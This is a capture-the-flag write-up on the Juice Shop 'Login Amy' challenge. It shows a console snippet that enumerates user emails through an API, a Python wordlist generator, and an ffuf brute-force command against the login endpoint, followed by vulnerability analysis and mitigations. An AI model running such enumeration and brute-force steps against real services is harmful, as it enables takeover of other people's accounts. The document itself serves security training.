# Login Amy
 
**Category:** Sensitive Data Exposure  
**Difficulty:** 3  
**File:** `Sensitive Data Exposure-3-Login Amy.md`
 
---
 
## Methodology
 
1. **Reconnaissance** — The challenge description states _"she did not read the 'One Important Final Note'"_, which immediately points to a specific reference about password security.
 
2. **OSINT — identifying the password format** — The "One Important Final Note" is a direct reference to the book **"The Art of Invisibility"** by Kevin Mitnick. Research into the book revealed that the final note recommends using a long passphrase as a secure password, and provides an example passphrase as illustration. This example follows a specific format: 3 alphanumeric characters followed by a long sequence of dots. Knowing this format, we determined that brute forcing only the first 3 characters was feasible.
 
3. **Email enumeration** — Retrieved Amy's email address from the Users API:
 
```javascript
fetch('/api/Users/', {
  headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
}).then(r => r.json()).then(d => {
  const amy = d.data.find(x => x.email.toLowerCase().includes('amy'))
  console.log(amy.email)
})
// Output: amy@juice-sh.op
```
 
4. **Wordlist generation** — Generated a wordlist of all possible 3-character alphanumeric prefixes combined with the known suffix of 21 dots using a Python script:
 
```python
import itertools
 
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
suffix = '.....................'
 
with open('wordlist.txt', 'w') as f:
    for combo in itertools.product(chars, repeat=3):
        f.write(''.join(combo) + suffix + '\n')
```
 
This generated 238,328 candidate passwords (`62^3` combinations).
 
5. **Brute force with ffuf** — Launched ffuf with the generated wordlist, including the session cookies and JWT token required by the CTF infrastructure:
 
```bash
ffuf -u https://ctf.juice.cyber.epitest.eu/rest/user/login \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: __Secure-ctf.juice.cyber.epitest.eu=<SESSION_COOKIE>; balancer=<BALANCER_COOKIE>; token=<JWT_TOKEN>" \
  -d '{"email":"amy@juice-sh.op","password":"FUZZ"}' \
  -w wordlist.txt \
  -fc 401 \
  -t 30 \
  -v
```
 
- `-fc 401` — filters out failed attempts, only shows HTTP 200 responses
- `-t 30` — 30 parallel threads to speed up the scan without triggering rate limiting
- `-v` — verbose output to monitor progress
 
6. **Validation** — ffuf identified the correct password and the login succeeded, marking the challenge as solved.
 
**Tools used:** Browser DevTools (console), OSINT (book reference research), Python (wordlist generation), ffuf (HTTP brute force).
 
---
 
## Vulnerabilities
 
**Name:** Sensitive Data Exposure via publicly known passphrase — CWE-521 (Weak Password Requirements) / CWE-200 (Exposure of Sensitive Information)  
**Affected component:** User authentication system (`POST /rest/user/login`), Amy's account  
**Severity:** Medium
 
Amy used a passphrase directly taken from a well-known cybersecurity book ("The Art of Invisibility" by Kevin Mitnick) as her password. While the passphrase is long enough to resist brute force attacks, it is publicly documented and therefore present in specialized wordlists used by attackers familiar with the reference. Furthermore, the predictable format of the passphrase (3 alphanumeric characters + fixed suffix) drastically reduces the effective keyspace to only 238,328 combinations, making it trivially brute-forceable once the format is known. The application also exposes user email addresses via the `/api/Users/` endpoint, making account enumeration trivial.
 
---
 
## Risks
 
**Business impact:**
 
- **Account compromise** — An attacker familiar with the book reference can trivially log in as Amy and access her personal data, order history, and payment information.
- **Data breach** — Compromised customer accounts expose personally identifiable information (PII), creating GDPR compliance risks.
- **Credential reuse** — If Amy reuses this passphrase on other services, a single compromise cascades across multiple platforms.
- **Reputational damage** — Customer account takeover damages trust in the platform's security posture.
 
---
 
## Actions
 
### Mitigation strategies
 
- Enforce strong, unique password policies that prevent the use of known passphrases, dictionary words, or publicly documented examples.
- Integrate Have I Been Pwned (HIBP) or similar breach databases into the registration/login flow to reject compromised passwords.
- Implement account lockout or rate limiting after repeated failed login attempts to slow credential stuffing attacks.
- Restrict access to the `/api/Users/` endpoint — regular users should not be able to enumerate all accounts.
 
### Remediation fixes
 
- Add a password strength checker during registration that rejects passwords found in common wordlists or known passphrase databases.
- Enforce multi-factor authentication (MFA) for all customer accounts to add a second layer of protection beyond passwords.
- Limit the `/api/Users/` endpoint to admin-only access, preventing unauthenticated or low-privilege users from enumerating email addresses.
 
### Best security practices
 
- Educate users that even long passphrases can be insecure if they are taken from publicly available sources — passwords must be both long and unique.
- Follow NIST SP 800-63B guidelines: check passwords against known breach databases, avoid complexity rules that encourage predictable patterns, and favor length over complexity.
- Never expose a full user list via an unauthenticated or low-privilege API endpoint.
- Reference: [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
